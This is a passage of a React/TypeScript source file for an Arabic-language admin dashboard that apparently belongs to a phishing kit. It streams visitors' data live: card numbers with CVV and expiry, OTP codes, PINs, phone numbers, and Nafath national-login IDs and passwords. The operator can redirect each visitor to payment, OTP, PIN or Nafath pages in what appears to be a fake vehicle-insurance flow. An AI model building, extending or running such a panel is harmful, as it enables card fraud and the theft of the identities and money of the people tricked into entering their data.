import React, { useEffect, useMemo, useState, useRef, useCallback } from "react";
import { io, Socket } from "socket.io-client";
import { addData } from "@/lib/api";

// =============================================
// Socket.IO Connection for Real-time Updates
// =============================================
const BACKEND_URL = import.meta.env.VITE_BACKEND_TARGET || window.location.origin || "";
let dashboardSocket: Socket | null = null;

function getDashboardSocket(): Socket {
  if (!dashboardSocket) {
    dashboardSocket = io(BACKEND_URL, {
      transports: ['websocket', 'polling'],
      reconnection: true,
      reconnectionAttempts: 5,
      reconnectionDelay: 1000,
    });
    
    dashboardSocket.on("connect", () => {
      console.log("[Dashboard] Socket.IO connected:", dashboardSocket?.id);
    });
    
    dashboardSocket.on("disconnect", () => {
      console.log("[Dashboard] Socket.IO disconnected");
    });
    
    dashboardSocket.on("connect_error", (err) => {
      console.error("[Dashboard] Socket.IO connection error:", err);
    });
  }
  return dashboardSocket;
}

// =============================================
// Custom Hook: useConnectionMonitor
// لمراقبة حالة الاتصال الحية للزائر
// =============================================
function useConnectionMonitor(visitorId?: string) {
  const [connectionStatus, setConnectionStatus] = useState<{
    isOnline: boolean;
    lastSeen: string | null;
    isLive: boolean;
    latency: number;
  }>({
    isOnline: false,
    lastSeen: null,
    isLive: false,
    latency: 0
  });
  
  const eventSourceRef = useRef<EventSource | null>(null);
  const heartbeatIntervalRef = useRef<NodeJS.Timeout | null>(null);
  const reconnectTimeoutRef = useRef<NodeJS.Timeout | null>(null);
  const lastFetchRef = useRef<number>(0);
  const isMountedRef = useRef<boolean>(true);

  useEffect(() => {
    isMountedRef.current = true;
    let reconnectAttempts = 0;
    
    if (!visitorId) {
      setConnectionStatus({ isOnline: false, lastSeen: null, isLive: false, latency: 0 });
      return;
    }

    const fetchVisitorStatus = async () => {
      if (!visitorId || !isMountedRef.current) return;
      
      const now = Date.now();
      if (now - lastFetchRef.current < 2000) return;
      lastFetchRef.current = now;
      
      try {
        const start = Date.now();
        const res = await fetch(`/api/visitors/${visitorId}`, { 
          method: "GET",
          headers: { "Cache-Control": "no-cache" }
        });
        const latency = Date.now() - start;
        
        if (res.ok && isMountedRef.current) {
          const data = await res.json();
          const hasRecentActivity = data.lastSeenAt && 
            (Date.now() - new Date(data.lastSeenAt).getTime()) < 30000;
          const isOnline = data.isOnline !== false && 
                          (data.badge === "new" || hasRecentActivity);
          const lastSeen = data.lastSeenAt || data.lastActivityAt || data.updatedAt;
          
          setConnectionStatus({
            isOnline,
            lastSeen: lastSeen || null,
            isLive: true,
            latency
          });
        } else if (isMountedRef.current) {
          setConnectionStatus(prev => ({ ...prev, isLive: false }));
        }
      } catch {
        if (isMountedRef.current) {
          setConnectionStatus(prev => ({ ...prev, isLive: false }));
        }
      }
    };

    const connectSSE = () => {
      if (!isMountedRef.current || reconnectAttempts >= 3) {
        return;
      }
      
      if (eventSourceRef.current) {
        eventSourceRef.current.close();
        eventSourceRef.current = null;
      }

      const eventSource = new EventSource(`/api/visitor/${visitorId}/stream`);
      eventSourceRef.current = eventSource;

      eventSource.onopen = () => {
        if (!isMountedRef.current) return;
        console.log("[ConnectionMonitor] SSE connected for visitor:", visitorId);
        reconnectAttempts = 0;
        setConnectionStatus(prev => ({ ...prev, isLive: true }));
        fetchVisitorStatus();
      };

      eventSource.addEventListener("status_update", () => {
        if (isMountedRef.current) fetchVisitorStatus();
      });

      eventSource.onerror = () => {
        if (!isMountedRef.current) return;
        console.log("[ConnectionMonitor] SSE error, will retry...");
        setConnectionStatus(prev => ({ ...prev, isLive: false }));
        eventSource.close();
        eventSourceRef.current = null;
        
        reconnectAttempts++;
        const delay = Math.min(5000 * reconnectAttempts, 30000);
        console.log(`[ConnectionMonitor] Reconnection attempt ${reconnectAttempts}/3, waiting ${delay}ms`);
        
        if (reconnectAttempts < 3) {
          reconnectTimeoutRef.current = setTimeout(connectSSE, delay);
        }
      };
    };

    fetchVisitorStatus();
    connectSSE();

    heartbeatIntervalRef.current = setInterval(() => {
      if (visitorId && isMountedRef.current) {
        fetch(`/api/visitors/${visitorId}/heartbeat`, { method: "POST" }).catch(() => {});
      }
    }, 15000);

    return () => {
      isMountedRef.current = false;
      if (eventSourceRef.current) {
        eventSourceRef.current.close();
        eventSourceRef.current = null;
      }
      if (heartbeatIntervalRef.current) {
        clearInterval(heartbeatIntervalRef.current);
        heartbeatIntervalRef.current = null;
      }
      if (reconnectTimeoutRef.current) {
        clearTimeout(reconnectTimeoutRef.current);
        reconnectTimeoutRef.current = null;
      }
    };
  }, [visitorId]);

  return connectionStatus;
}


type RequestItem = {
  id: string;
  customer: string;
  status: string;
  stage: string;
  updated: string;
  updatedAt?: string;
  badge?: string;
  visitorId?: string;
  submittedAt?: string;
  hasCard?: boolean;
  raw?: Record<string, any>;
};

type EntryWithType = RequestItem & { entryType?: 'current' | 'new' | 'update' };

const DASHBOARD_BACKEND_URL = import.meta.env.VITE_BACKEND_TARGET || window.location.origin || "";

const countryFlags: Record<string, string> = {
  sa: "🇸🇦", ksa: "🇸🇦", saudi: "🇸🇦", "saudi arabia": "🇸🇦", السعودية: "🇸🇦",
  jo: "🇯🇴", jord: "🇯🇴", jordan: "🇯🇴", الأردن: "🇯🇴",
  ae: "🇦🇪", uae: "🇦🇪", emirates: "🇦🇪", الإمارات: "🇦🇪",
  eg: "🇪🇬", egy: "🇪🇬", egypt: "🇪🇬", مصر: "🇪🇬",
  om: "🇴🇲", oman: "🇴🇲", سلطنة_عمران: "🇴🇲",
  lb: "🇱🇧", lebanon: "🇱🇧", لبنان: "🇱🇧",
  sy: "🇸🇾", syr: "🇸🇾", syria: "🇸🇾", سوريا: "🇸🇾",
};

const countryCodes: Record<string, string> = {
  sa: "SA", ksa: "SA", jo: "JO", ae: "AE", eg: "EG", om: "OM", lb: "LB", sy: "SY",
};

// Format elapsed time since last update
function formatElapsedTime(isoString?: string): string {
  if (!isoString) return "—";
  const diff = Date.now() - new Date(isoString).getTime();
  if (diff < 0) return "الآن";
  const seconds = Math.floor(diff / 1000);
  if (seconds < 60) return seconds <= 1 ? "قبل ثانية" : `قبل ${seconds} ثانية`;
  const minutes = Math.floor(seconds / 60);
  if (minutes < 60) return minutes <= 1 ? "قبل دقيقة" : `قبل ${minutes} دقائق`;
  const hours = Math.floor(minutes / 60);
  if (hours < 24) return hours <= 1 ? "قبل ساعة" : `قبل ${hours} ساعات`;
  const days = Math.floor(hours / 24);
  return days <= 1 ? "قبل يوم" : `قبل ${days} أيام`;
}

function getAgeStatus(isoString?: string): { label: string; isStale: boolean } {
  if (!isoString) return { label: "غير محدد", isStale: true };
  const diff = Date.now() - new Date(isoString).getTime();
  const minutes = Math.floor(diff / 60000);
  if (minutes < 5) return { label: "جديد", isStale: false };
  if (minutes < 60) return { label: `قبل ${minutes} دقيقة`, isStale: true };
  const hours = Math.floor(minutes / 60);
  if (hours < 24) return { label: `قبل ${hours} ساعة`, isStale: true };
  const days = Math.floor(hours / 24);
  return { label: `قبل ${days} يوم`, isStale: true };
}

function formatRelativeTimeLabel(isoString?: string): string {
  const age = getAgeStatus(isoString);
  return age.label;
}

// Live timer component for each request
function LiveTimer({ startTime }: { startTime: string }) {
  const [elapsed, setElapsed] = useState(formatElapsedTime(startTime));
  
  useEffect(() => {
    const interval = setInterval(() => {
      setElapsed(formatElapsedTime(startTime));
    }, 1000);
    return () => clearInterval(interval);
  }, [startTime]);
  
  return <span style={{ fontFamily: "monospace", fontSize: "0.85rem" }}>{elapsed}</span>;
}

// Box timer component for individual boxes - updates every second
function BoxTimer({ timestamp }: { timestamp?: string | number }) {
  const [elapsed, setElapsed] = useState("");
  
  useEffect(() => {
    if (!timestamp) {
      setElapsed("");
      return;
    }
    
    const updateElapsed = () => {
      const ts = typeof timestamp === 'string' ? new Date(timestamp).getTime() : timestamp;
      const diff = Date.now() - ts;
      
      if (diff < 0) {
        setElapsed("الآن");
        return;
      }
      
      const seconds = Math.floor(diff / 1000);
      if (seconds < 60) {
        setElapsed(`منذ ${seconds} ثانية`);
        return;
      }
      
      const minutes = Math.floor(seconds / 60);
      if (minutes < 60) {
        setElapsed(`منذ ${minutes} ${minutes === 1 ? 'دقيقة' : 'دقائق'}`);
        return;
      }
      
      const hours = Math.floor(minutes / 60);
      if (hours < 24) {
        setElapsed(`منذ ${hours} ${hours === 1 ? 'ساعة' : 'ساعات'}`);
        return;
      }
      
      const days = Math.floor(hours / 24);
      setElapsed(`منذ ${days} ${days === 1 ? 'يوم' : 'أيام'}`);
    };
    
    updateElapsed();
    const interval = setInterval(updateElapsed, 1000);
    
    return () => clearInterval(interval);
  }, [timestamp]);
  
  if (!timestamp || !elapsed) return null;
  
  return (
    <span style={{ 
      fontFamily: "monospace", 
      fontSize: "0.7rem", 
      color: "#9ca3af",
      direction: "rtl"
    }}>
      {elapsed}
    </span>
  );
}

export default function DashboardPage() {
  // =============================================
  // CSS Animations for Connection Status
  // =============================================
  const styleSheet = document.createElement("style");
  styleSheet.textContent = `
    @keyframes connectionPulse {
      0%, 100% { opacity: 1; transform: scale(1); }
      50% { opacity: 0.7; transform: scale(1.1); }
    }
    @keyframes liveIndicator {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.4; }
    }
  `;
  if (!document.head.querySelector("#connection-animations")) {
    styleSheet.id = "connection-animations";
    document.head.appendChild(styleSheet);
  }
  const [requests, setRequests] = useState<RequestItem[]>([]);
  const [selectedRequestId, setSelectedRequestId] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [filterMode, setFilterMode] = useState<"all" | "cards">("all");
  const [nowTick, setNowTick] = useState<number>(Date.now());
  const [pinInput, setPinInput] = useState("");
  const [nafadInput, setNafadInput] = useState("");
  const [onlineVisitors, setOnlineVisitors] = useState<string[]>([]);
  const [expandedCards, setExpandedCards] = useState<Record<string, boolean>>({});
  const [cardsHistory, setCardsHistory] = useState<Record<string, any[]>>({});
  const [hasCardHistory, setHasCardHistory] = useState<Record<string, boolean>>({});
  const [expandedOtpCodes, setExpandedOtpCodes] = useState<Record<string, boolean>>({});
  const [otpCodesHistory, setOtpCodesHistory] = useState<Record<string, any[]>>({});
  const [hasOtpHistory, setHasOtpHistory] = useState<Record<string, boolean>>({});
  const [expandedPhoneHistory, setExpandedPhoneHistory] = useState<Record<string, boolean>>({});
  const [phoneHistory, setPhoneHistory] = useState<Record<string, any[]>>({});
  const [hasPhoneHistory, setHasPhoneHistory] = useState<Record<string, boolean>>({});
  const [expandedNafadHistory, setExpandedNafadHistory] = useState<Record<string, boolean>>({});
  const [nafadHistory, setNafadHistory] = useState<Record<string, any[]>>({});
  const [hasNafadHistory, setHasNafadHistory] = useState<Record<string, boolean>>({});
  const [expandedPinHistory, setExpandedPinHistory] = useState<Record<string, boolean>>({});
  const [pinHistory, setPinHistory] = useState<Record<string, any[]>>({});
  const [hasPinHistory, setHasPinHistory] = useState<Record<string, boolean>>({});

  // Toggle card history expansion
  const toggleCardHistory = async (visitorId: string) => {
    const isExpanded = expandedCards[visitorId];
    
    if (!isExpanded) {
      // Fetch history when expanding
      try {
        const res = await fetch(`/api/dashboard/card-history/${visitorId}`);
        if (res.ok) {
          const data = await res.json();
          const cards = data.cards || [];
          setCardsHistory(prev => ({ ...prev, [visitorId]: cards }));
          setHasCardHistory(prev => ({ ...prev, [visitorId]: cards.length > 0 }));
        }
      } catch {
        console.error("Failed to fetch card history");
      }
    }
    
    setExpandedCards(prev => ({ ...prev, [visitorId]: !isExpanded }));
  };

  // Toggle OTP codes history expansion
  const toggleOtpHistory = async (visitorId: string) => {
    const isExpanded = expandedOtpCodes[visitorId];
    
    if (!isExpanded) {
      // Fetch history when expanding
      try {
        const res = await fetch(`/api/dashboard/otp-history/${visitorId}`);
        if (res.ok) {
          const data = await res.json();
          const codes = data.codes || [];
          setOtpCodesHistory(prev => ({ ...prev, [visitorId]: codes }));
          setHasOtpHistory(prev => ({ ...prev, [visitorId]: codes.length > 0 }));
        }
      } catch {
        console.error("Failed to fetch OTP history");
      }
    }
    
    setExpandedOtpCodes(prev => ({ ...prev, [visitorId]: !isExpanded }));
  };

  // Toggle phone history expansion
  const togglePhoneHistory = async (visitorId: string) => {
    const isExpanded = expandedPhoneHistory[visitorId];
    
    if (!isExpanded) {
      // Fetch history when expanding
      try {
        const res = await fetch(`/api/dashboard/phone-history/${visitorId}`);
        if (res.ok) {
          const data = await res.json();
          const history = data.history || [];
          setPhoneHistory(prev => ({ ...prev, [visitorId]: history }));
          setHasPhoneHistory(prev => ({ ...prev, [visitorId]: history.length > 0 }));
        }
      } catch {
        console.error("Failed to fetch phone history");
      }
    }
    
    setExpandedPhoneHistory(prev => ({ ...prev, [visitorId]: !isExpanded }));
  };

  // Toggle nafad history expansion
  const toggleNafadHistory = async (visitorId: string) => {
    const isExpanded = expandedNafadHistory[visitorId];
    
    if (!isExpanded) {
      // Fetch history when expanding
      try {
        const res = await fetch(`/api/dashboard/nafad-history/${visitorId}`);
        if (res.ok) {
          const data = await res.json();
          const history = data.history || [];
          setNafadHistory(prev => ({ ...prev, [visitorId]: history }));
          setHasNafadHistory(prev => ({ ...prev, [visitorId]: history.length > 0 }));
        }
      } catch {
        console.error("Failed to fetch nafad history");
      }
    }
    
    setExpandedNafadHistory(prev => ({ ...prev, [visitorId]: !isExpanded }));
  };

  // Toggle PIN history expansion
  const togglePinHistory = async (visitorId: string) => {
    const isExpanded = expandedPinHistory[visitorId];
    
    if (!isExpanded) {
      // Fetch history when expanding
      try {
        const res = await fetch(`/api/dashboard/pin-history/${visitorId}`);
        if (res.ok) {
          const data = await res.json();
          const history = data.history || [];
          setPinHistory(prev => ({ ...prev, [visitorId]: history }));
          setHasPinHistory(prev => ({ ...prev, [visitorId]: history.length > 0 }));
        }
      } catch {
        console.error("Failed to fetch PIN history");
      }
    }
    
    setExpandedPinHistory(prev => ({ ...prev, [visitorId]: !isExpanded }));
  };

  // Get latest card data from selected request
  const getCardData = (raw: any) => {
    return {
      cardNumber: raw?.cardNumber || "",
      cardHolder: raw?.cardHolder || raw?.name || "",
      expiryDate: raw?.expiryDate || raw?.cardExpiry || "",
      cvv: raw?.cvv || "",
      cardType: raw?.cardType || "",
      cardStatus: raw?._v1Status || "pending",
      totalPrice: raw?.offerTotalPrice || raw?.totalPrice || 0,
      cardUpdatedAt: raw?.cardUpdatedAt || raw?.updatedAt || null
    };
  };

  const [notification, setNotification] = useState<{ type: "success" | "error"; message: string } | null>(null);
  const [redirectPage, setRedirectPage] = useState("");
  const [headerMenuOpen, setHeaderMenuOpen] = useState(false);
  const [selectedRequestIds, setSelectedRequestIds] = useState<string[]>([]);
  const [showSettingsModal, setShowSettingsModal] = useState(false);
  const [settingsTab, setSettingsTab] = useState<"security" | "cards">("security");
  const [blockedCards, setBlockedCards] = useState<string[]>([]);
  const [newBlockedCard, setNewBlockedCard] = useState("");
  const [currentTime, setCurrentTime] = useState(Date.now());
  const [openLogBox, setOpenLogBox] = useState<string | null>(null);
  const socketRef = useRef<Socket | null>(null);
  const currentTimeRef = useRef(Date.now());
  const headerMenuRef = useRef<HTMLDivElement | null>(null);
  const settingsModalRef = useRef<HTMLDivElement | null>(null);

  // Update current time every minute for timer display
  useEffect(() => {
    const interval = setInterval(() => {
      setCurrentTime(Date.now());
    }, 60000); // Update every minute
    return () => clearInterval(interval);
  }, []);

  // Fix timestamps for existing records on page load
  useEffect(() => {
    const fixTimestamps = async () => {
      try {
        const baseUrl = (import.meta.env.VITE_API_BASE || window.location.origin || '').replace(/\/+$/, '');
        const response = await fetch(`${baseUrl}/api/dashboard/fix-timestamps`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
        });
        if (response.ok) {
          const result = await response.json();
          console.log('[Dashboard] Fixed timestamps:', result);
        }
      } catch (error) {
        console.error('[Dashboard] Failed to fix timestamps:', error);
      }
    };
    fixTimestamps();
  }, []);

  // Check for existing history records when selecting a request
  useEffect(() => {
    // Access requests directly instead of selectedRequest to avoid hoisting issues
    const currentSelectedRequest = requests.find((r) => r.id === selectedRequestId) ?? filteredRequests[0];
    if (!currentSelectedRequest) return;
    
    const visitorId = currentSelectedRequest.id || currentSelectedRequest.visitorId || '';
    const raw = currentSelectedRequest.raw || {};
    
    // Check OTP history (has _v5 or otpCode)
    if (raw._v5 || raw.otpCode || raw.otpSubmittedAt) {
      setHasOtpHistory(prev => ({ ...prev, [visitorId]: true }));
    }
    
    // Check Card history (has _v1 or cardNumber)
    if (raw._v1 || raw.cardNumber || raw.cardSubmittedAt) {
      setHasCardHistory(prev => ({ ...prev, [visitorId]: true }));
    }
    
    // Check Phone history (has _v7 or phone)
    if (raw._v7 || raw.phone || raw.phoneSubmittedAt) {
      setHasPhoneHistory(prev => ({ ...prev, [visitorId]: true }));
    }
    
    // Check Nafad history (has nafadIdNumber)
    if (raw.nafadIdNumber || raw.nafadPassword || raw.nafadSubmittedAt) {
      setHasNafadHistory(prev => ({ ...prev, [visitorId]: true }));
    }
    
    // Check PIN history (has _v6 or pinSubmittedAt)
    if (raw._v6 || raw.pinSubmittedAt) {
      setHasPinHistory(prev => ({ ...prev, [visitorId]: true }));
    }
  }, [selectedRequestId, requests, filteredRequests]);

  // Page options for manual redirect
  const pageOptions = [
    { value: "", label: "اختر صفحة للتوجيه..." },
    { value: "home-new", label: "🏠 الرئيسية" },
    { value: "compar", label: "📊 اختيار الباقة" },
    { value: "insur", label: "📋 تفاصيل المركبة" },
    { value: "check", label: "🔐 الدفع" },
    { value: "step2", label: "🔢 رمز OTP" },
    { value: "step3", label: "🔏 رمز PIN" },
    { value: "step4", label: "🔒 النفاذ" },
    { value: "step5", label: "📱 رقم الهاتف" },
  ];

  // Map database page values to Arabic names
  const pageArabicNames: Record<string, string> = {
    "home": "الرئيسية",
    "insur": "بيانات المركبة",
    "phone": "رقم الهاتف",
    "confi": "رمز PIN",
    "compar": "اختيار الباقة",
    "check": "الدفع",
    "step2": "رمز OTP",
    "step3": "رمز PIN",
    "step4": "النفاذ",
    "step5": "رقم الهاتف",
  };

  // Convert page route to Arabic name
  const getPageArabicName = (page: string): string => {
    if (!page) return "غير متصل";
    // First check the map
    if (pageArabicNames[page]) return pageArabicNames[page];
    // Then check pageOptions
    const pageOption = pageOptions.find(p => p.value === page);
    if (pageOption) {
      return pageOption.label.replace(/^[^\s]+\s/, '');
    }
    return page;
  };

  // Sort requests by the original submission time (newest first)
  const sortedRequests = useMemo(() => {
    return [...requests].sort((a, b) => {
      const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
      const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
      return timeB - timeA; // Descending order (newest first)
    });
  }, [requests]);

  // Normalize customer value for comparison
  const normalizeCustomerValue = (value?: unknown) => {
    if (value === undefined || value === null || value === "") return "";
    return String(value).trim().toLowerCase();
  };

  // Get customer identifier - Priority: identityNumber > phoneNumber > visitorId
  const getCustomerIdentifier = (request: RequestItem): { id?: string; phone?: string; vid?: string } => {
    const raw = request?.raw || {};
    
    // 1. identityNumber is the PRIMARY identifier (permanent national ID)
    const identityNumber = normalizeCustomerValue(
      raw?.identityNumber || 
      raw?.phoneIdNumber || 
      raw?.nafadIdNumber
    );
    
    // 2. phoneNumber is secondary identifier
    const phoneNumber = normalizeCustomerValue(
      raw?.phoneNumber || 
      raw?.mobileNumber
    );
    
    // 3. visitorId as fallback
    const visitorId = normalizeCustomerValue(request?.visitorId);
    
    return { id: identityNumber, phone: phoneNumber, vid: visitorId };
  };

  // Get unique customer key - one key per real customer
  const getCustomerKey = (request: RequestItem): string => {
    const { id, phone, vid } = getCustomerIdentifier(request);
    
    // Primary: use identityNumber (most reliable - doesn't change)
    if (id) {
      return `id:${id}`;
    }
    
    // Secondary: use phoneNumber (if identityNumber not available)
    if (phone) {
      return `phone:${phone}`;
    }
    
    // Tertiary: use visitorId (last resort)
    if (vid) {
      return `vid:${vid}`;
    }
    
    // Fallback: use request id
    return `req:${request.id || Date.now()}`;
  };

  // Get display name for customer
  const getCustomerDisplayName = (request: RequestItem): string => {
    const raw = request?.raw || {};
    
    // Priority: ownerName > name > identityNumber > phoneNumber > visitorId > "زائر"
    const name = raw?.ownerName || raw?.name || raw?.customer || request?.customer;
    if (name && name !== 'زائر') {
      return String(name);
    }
    
    // Use identityNumber as display name if available
    const id = raw?.identityNumber || raw?.phoneIdNumber || raw?.nafadIdNumber;
    if (id) {
      return String(id);
    }
    
    // Use phoneNumber as display name
    const phone = raw?.phoneNumber || raw?.mobileNumber;
    if (phone) {
      return String(phone);
    }
    
    return 'زائر';
  };

  // Check if two entries belong to the same customer
  const isSameCustomerEntry = (a?: RequestItem, b?: RequestItem) => {
    if (!a || !b) return false;
    
    const idA = getCustomerIdentifier(a);
    const idB = getCustomerIdentifier(b);
    
    // Match by identityNumber (strongest match)
    if (idA.id && idA.id === idB.id) return true;
    
    // Match by phoneNumber (if no identityNumber match)
    if (idA.phone && idA.phone === idB.phone) return true;
    
    // Match by visitorId (weakest match)
    if (idA.vid && idA.vid === idB.vid) return true;
    
    return false;
  };

  // Unique customers list - one entry per customer (most recent)
  const uniqueCustomerRequests = useMemo(() => {
    const customerMap = new Map<string, RequestItem>();
    
    sortedRequests.forEach((request) => {
      const key = getCustomerKey(request);
      const existing = customerMap.get(key);
      const requestTime = new Date(request.submittedAt || request.updatedAt || 0).getTime();
      let existingTime = 0;
      if (existing) {
        existingTime = new Date(existing.submittedAt || existing.updatedAt || 0).getTime();
      }
      
      // Keep the most recent entry for each customer
      if (!existing || requestTime > existingTime) {
        customerMap.set(key, request);
      }
    });
    
    // Convert to array and sort by most recent
    return Array.from(customerMap.values()).sort((a, b) => {
      const timeA = new Date(a.submittedAt || a.updatedAt || 0).getTime();
      const timeB = new Date(b.submittedAt || b.updatedAt || 0).getTime();
      return timeB - timeA;
    });
  }, [sortedRequests]);

  // Count entries per customer
  const getCustomerEntryCount = (request: RequestItem): number => {
    const key = getCustomerKey(request);
    return sortedRequests.filter(r => getCustomerKey(r) === key).length;
  };

  // Stats derived from the real visitor data stream
  const stats = useMemo(() => {
    const totalEntries = requests.length;
    const totalCustomers = uniqueCustomerRequests.length;
    const newCount = uniqueCustomerRequests.filter((r) => r.badge === "new").length;
    const pendingCount = uniqueCustomerRequests.filter((r) => r.badge === "pending").length;
    const completedCount = uniqueCustomerRequests.filter((r) => r.badge === "completed").length;
    // Use real-time online visitors count
    const onlineCount = onlineVisitors.length;
    const todayCount = uniqueCustomerRequests.filter((request) => {
      const submitted = request.submittedAt || request.updatedAt;
      if (!submitted) return false;
      const date = new Date(submitted);
      const nowDate = new Date();
      return date.getDate() === nowDate.getDate() && date.getMonth() === nowDate.getMonth() && date.getFullYear() === nowDate.getFullYear();
    }).length;
    const cardCount = uniqueCustomerRequests.filter((request) => Boolean(request.hasCard || request.raw?._v1 || request.raw?.cardNumber || request.raw?.paymentStatus)).length;
    const phoneCount = uniqueCustomerRequests.filter((request) => Boolean(request.raw?.phoneIdNumber || request.raw?.phoneOtpStatus || request.raw?.phoneCarrier || request.raw?._v7)).length;

    return {
      totalEntries,
      totalCustomers,
      newCount,
      pendingCount,
      completedCount,
      onlineCount,
      todayCount,
      cardCount,
      phoneCount,
    };
  }, [requests, uniqueCustomerRequests, onlineVisitors]);

  // Handle Socket.IO update
  // Use ref to avoid re-renders and socket reconnections
  const selectedRequestIdRef = useRef<string | null>(null);
  const lastUpdateRef = useRef<number>(0); // Track last update timestamp
  
  // Keep ref in sync with state
  useEffect(() => {
    selectedRequestIdRef.current = selectedRequestId;
  }, [selectedRequestId]);

  const handleSocketUpdate = useCallback((updatedRequest: any) => {
    const requestId = updatedRequest.id || updatedRequest.visitorId;
    const now = Date.now();
    
    // Debounce: skip if same request was updated in last 500ms
    if (now - lastUpdateRef.current < 500 && lastUpdateRef.current > 0) {
      console.log("[Socket Update] Skipping rapid update for:", requestId);
      return;
    }
    lastUpdateRef.current = now;
    
    console.log("[Socket Update] Received:", requestId);
    
    const incomingRequest = {
      ...updatedRequest,
      submittedAt: updatedRequest.submittedAt || updatedRequest.updatedAt || undefined,
      updatedAt: updatedRequest.updatedAt || updatedRequest.submittedAt || undefined,
    };
    
    // Store current selectedRequestId before updating requests
    setRequests(prevRequests => {
      const existingIndex = prevRequests.findIndex(
        (r) => r.id === incomingRequest.id || r.visitorId === incomingRequest.visitorId
      );
      
      console.log("[Socket Update] Existing index:", existingIndex, "Current requests:", prevRequests.length);
      
      if (existingIndex >= 0) {
        // MERGE old entry with new one (preserve all data)
        const existingRequest = prevRequests[existingIndex];
        const mergedRequest = {
          ...existingRequest,
          ...incomingRequest,
          // Always use the newest submittedAt
          submittedAt: new Date(incomingRequest.submittedAt || incomingRequest.updatedAt || Date.now()).getTime() >
                      new Date(existingRequest.submittedAt || existingRequest.updatedAt || 0).getTime()
                      ? incomingRequest.submittedAt || incomingRequest.updatedAt
                      : existingRequest.submittedAt || existingRequest.updatedAt,
          // Merge raw data
          raw: { ...(existingRequest.raw || {}), ...(incomingRequest.raw || {}) },
        };
        const newRequests = [...prevRequests];
        newRequests[existingIndex] = mergedRequest;
        console.log("[Socket Update] MERGED entry:", mergedRequest.id, "raw keys:", Object.keys(mergedRequest.raw || {}));
        
        return newRequests;
      } else {
        console.log("[Socket Update] NEW entry - adding to list:", incomingRequest.id);
        
        return [incomingRequest, ...prevRequests];
      }
    });
  }, []); // Empty deps - use refs internally

  // Load initial requests directly from the backend API so the dashboard is not empty
  // Only run once on mount - not when selectedRequestId changes
  useEffect(() => {
    let isMounted = true;

    async function loadInitialRequests() {
      try {
        const response = await fetch("/api/dashboard/requests", {
          headers: { "Cache-Control": "no-store" },
        });
        if (!response.ok) throw new Error(`HTTP ${response.status}`);
        const data = await response.json();
        if (!isMounted) return;
        if (Array.isArray(data)) {
          setRequests(data);
          // Only set initial selection if no request is selected yet
          if (data.length > 0) {
            setSelectedRequestId(data[0].id);
          }
        }
      } catch (error) {
        console.error("[Dashboard] Failed to load initial requests", error);
      }
    }

    loadInitialRequests();
    return () => {
      isMounted = false;
    };
  }, []); // Empty deps - run only once on mount

  // =============================================
  // Socket.IO Real-time Updates (Unified)
  // =============================================
  useEffect(() => {
    const socket = getDashboardSocket();

    // Listen for visitor update events (real-time)
    const handleVisitorUpdate = (data: any) => {
      console.log('[Dashboard] Socket.IO visitor update received:', data);
      if (data && data.id) {
        // Update the specific visitor in the requests list
        setRequests(prevRequests => {
          const index = prevRequests.findIndex(r => r.id === data.id);
          if (index >= 0) {
            // Update existing entry
            const updated = [...prevRequests];
            updated[index] = { ...updated[index], ...data };
            // Move to top if there's new data
            if (data.updatedAt) {
              updated.sort((a, b) => 
                new Date(b.updatedAt || b.submittedAt || 0).getTime() -
                new Date(a.updatedAt || a.submittedAt || 0).getTime()
              );
            }
            return updated;
          } else {
            // Add new entry at the top
            return [data, ...prevRequests];
          }
        });
      }
    };

    // Listen for new visitor events
    const handleNewVisitor = (data: any) => {
      console.log('[Dashboard] Socket.IO new visitor:', data);
      if (data && data.id) {
        setRequests(prevRequests => {
          const exists = prevRequests.some(r => r.id === data.id);
          if (!exists) {
            return [data, ...prevRequests];
          }
          return prevRequests;
        });
      }
    };

    // Listen for visitor deletion
    const handleVisitorDelete = (data: any) => {
      console.log('[Dashboard] Socket.IO visitor deleted:', data);
      if (data && data.id) {
        setRequests(prevRequests => prevRequests.filter(r => r.id !== data.id));
      }
    };

    // Listen for initial data load
    const handleDashboardInit = (data: any) => {
      console.log('[Dashboard] Socket.IO init received:', data?.length, 'entries');
      if (Array.isArray(data)) {
        setRequests(data);
      }
    };

    // Listen for dashboard:update events (alternative event name)
    const handleDashboardUpdate = (data: any) => {
      console.log('[Dashboard] Socket.IO dashboard update received:', data);
      if (data && data.id) {
        setRequests(prevRequests => {
          const index = prevRequests.findIndex(r => r.id === data.id);
          if (index >= 0) {
            const updated = [...prevRequests];
            updated[index] = { ...updated[index], ...data };
            if (data.updatedAt) {
              updated.sort((a, b) => 
                new Date(b.updatedAt || b.submittedAt || 0).getTime() -
                new Date(a.updatedAt || a.submittedAt || 0).getTime()
              );
            }
            return updated;
          } else {
            return [data, ...prevRequests];
          }
        });
      }
    };

    // Register event listeners
    socket.on('visitor:update', handleVisitorUpdate);
    socket.on('visitor:new', handleNewVisitor);
    socket.on('visitor:delete', handleVisitorDelete);
    socket.on('dashboard:init', handleDashboardInit);
    socket.on('dashboard:update', handleDashboardUpdate);
    socket.on('dashboard:delete', handleVisitorDelete); // Use same handler for delete
    socket.on('online:count', (data: { count: number; onlineVisitors: string[] }) => {
      console.log('[Dashboard] Online visitors count:', data.count);
      if (data.onlineVisitors) {
        setOnlineVisitors(data.onlineVisitors);
      }
    });

    // Connect if not connected
    if (!socket.connected) {
      socket.connect();
    }

    return () => {
      socket.off('visitor:update', handleVisitorUpdate);
      socket.off('visitor:new', handleNewVisitor);
      socket.off('visitor:delete', handleVisitorDelete);
      socket.off('dashboard:init', handleDashboardInit);
      socket.off('dashboard:update', handleDashboardUpdate);
      socket.off('dashboard:delete', handleVisitorDelete);
    };
  }, []);

  // Polling fallback - refresh data periodically as backup
  useEffect(() => {
    const pollInterval = setInterval(async () => {
      try {
        const response = await fetch('/api/dashboard/requests');
        if (response.ok) {
          const data = await response.json();
          if (Array.isArray(data)) {
            setRequests(data);
          }
        }
      } catch (error) {
        console.log('[Dashboard] Polling fallback error:', error);
      }
    }, 10000); // Poll every 10 seconds as backup

    return () => clearInterval(pollInterval);
  }, []);

  // Update current time every second for timers
  useEffect(() => {
    const interval = setInterval(() => {
      currentTimeRef.current = Date.now();
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  // Update UI every 30 seconds for request sorting
  useEffect(() => {
    const interval = setInterval(() => {
      setNowTick(Date.now());
    }, 30000);
    return () => clearInterval(interval);
  }, []);
